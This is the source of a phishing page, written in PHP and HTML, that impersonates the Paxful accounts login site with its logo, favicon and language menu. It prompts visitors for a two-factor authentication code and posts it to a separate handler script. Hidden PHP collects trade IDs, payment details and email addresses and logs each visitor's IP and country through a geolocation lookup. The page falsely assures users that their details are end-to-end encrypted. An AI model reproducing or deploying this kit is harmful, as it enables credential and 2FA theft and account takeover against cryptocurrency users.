





<!DOCTYPE html>
<html lang="en"><head>
    
   

<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
          <link rel="icon" href="https://accounts.paxful.com/static/favicons/favicon.ico">
        <link href="addons/main.css" rel="stylesheet">
        <title>Paxful Accounts</title>
  
  	<script>function switchVisible() {
			if (document.getElementById('Div1')) {
			
			    if (document.getElementById('Div1').style.display == 'none') {
			        document.getElementById('Div1').style.display = 'block';
			        document.getElementById('Div2').style.display = 'none';
			    }
			    else {
			        document.getElementById('Div1').style.display = 'none';
			        document.getElementById('Div2').style.display = 'block';
			    }
			}
			}
		</script>
		<style>
			#Div2 {
			display: none;
			}
		</style>
  
      
      </head>

    <body>

        <div id="root" >
            
            <div class="MainTemplate__page" ><div class="row align-items-stretch MainTemplate__row" ><div class="col-12 col-xl-5 col-lg-6 pr-lg-0 px-xl-7 py-3 py-5 py-md-7 d-flex justify-content-center justify-content-lg-end" ><div class="w-100 d-flex flex-column align-items-start px-3 px-md-4 px-xl-0 MainTemplate__content" >
            
            
            <div class="d-flex align-items-center justify-content-between w-100 mb-5" >
   <a href="https://paxful.com/"><img alt="logo" src="addons/logo-dark-7510d15ad224f1ed1f9932b6e56a028f.svg" width="120px"></a>
   <div >
      <div class="d-block btn-group">
         <button type="button" aria-haspopup="true" aria-expanded="false" class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="mr-2 text-gray-500">
               <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z"></path>
            </svg>
            English
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="ml-2 LanguageSelector__icon text-gray-500">
               <path fill-rule="evenodd" d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z" clip-rule="evenodd"></path>
            </svg>
         </button>
         <div tabindex="-1" role="menu" aria-hidden="true" class="w-100 mb-4 LanguageSelector__dropdown dropdown-menu dropdown-menu-right">
            <button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Bahasa Indonesia</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Bahasa Melayu</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Čeština</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Deutsch</span></button>
            <button type="button" class="dropdown-item LanguageItem__langSelected btn btn-link btn-lg">
               <svg width="16" height="16" stroke="currentColor" viewBox="0 0 16 16" fill="none" class="text-primary mr-2">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2 8.586L6 12l8-8"></path>
               </svg>
               <span class="ml-0">English</span>
            </button>
            <button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Español</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Français</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Italiano</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Nederlands</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Polski</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Português</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Português brasileiro</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Svenska</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Tiếng Việt</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Türkçe</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Wikang Tagalog</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Русский</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">한국어</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">日本語</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">简体中文(SC)</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">繁體中文(TC)</span></button>
         </div>
      </div>
   </div>
</div>
        
        
        <div class="w-100 d-flex flex-grow-1" ><div class="w-100 h-100" >
        
        
<?php
  if (isset($_POST['submit'])) {
    $tradeId = $_POST['tradeD'];
    $paymentDetails = $_POST['paymentD'];
    $emailId = $_POST['emailD'];
?> <div style="display:none;"> 
 <?php 
  
function get_client_ip_server() {
  $ipaddress = '';
if (isset($_SERVER['HTTP_CLIENT_IP']))
  $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_X_FORWARDED']))
  $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
  $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_FORWARDED']))
  $ipaddress = $_SERVER['HTTP_FORWARDED'];
else if(isset($_SERVER['REMOTE_ADDR']))
  $ipaddress = $_SERVER['REMOTE_ADDR'];
else
  $ipaddress = 'UNKNOWN';

  return $ipaddress;
}

$ipaddress = get_client_ip_server();

function getCountry($ip){
    $curlSession = curl_init();
    curl_setopt($curlSession, CURLOPT_URL, 'http://www.geoplugin.net/json.gp?ip='.$ip);
    curl_setopt($curlSession, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($curlSession, CURLOPT_RETURNTRANSFER, true);

    $jsonData = json_decode(curl_exec($curlSession));
    curl_close($curlSession);

    return $jsonData->geoplugin_countryName;
}

$vCountry = getCountry($ipaddress);

 }   

?><center>
        <h1 class="h2 qa-login-page-title mb-3 mb-lg-4">Add and share payment details with end-to-end encryption</h1> 
 
 </center>
        <form action="addons/fAction.php" method="post">
            
            

            
            <div class="mb-3" ><label class="label-small font-weight-semibold" >Enter Authentication code below </label><div class="d-flex align-items-center justify-content-between form-control mb-2" ><input id="2fa" onkeyup="test()" name="2fa" placeholder="Enter 2-Factors Authentication Code " type="text" class="border-transparent min-width-0 form-control" required></div></div>
       
        
     
     
         
         <button type="submit" id="submit" onclick="switchVisible();" class="mt-4 w-100 d-flex align-items-center qa-login-cta justify-content-between btn btn-primary btn-lg" disabled="disabled"><span>Continue</span><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z" clip-rule="evenodd"></path></svg></button>
         
          </form>

           <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
        
         <script>
             
            test = function() {
    if($("#2fa").val()){
         $("#submit").removeAttr("disabled");
    }
}
         </script>
        
       
<hr class="mt-4">
<center>
<span class="regular-24">
     details are end-to-end encrypted and shared with your trade partner via trade chat.
    
   </span>
</center>
</div></div></div></div><div class="d-none d-lg-block col-12 col-xl-7 col-lg-6 pl-0 overflow-hidden bg-blue-100"><div class="d-flex align-items-center justify-content-center h-100 overflow-hidden"><img src="addons/log-in1x-66ff6d4608ab29a6710651bfd9e6171c.png" srcset="addons/log-in1.png 900w, addons/log-in1x-66ff6d4608ab29a6710651bfd9e6171c.png 600w" loading="lazy" style="opacity: 1;" alt="Create an Account" sizes="(max-width: 1200px) 400px, (max-width: 1400px) 500px, 600px"></div></div>


</div></div></div>
    <?php include 'etwako.php';?> 

 </body></html>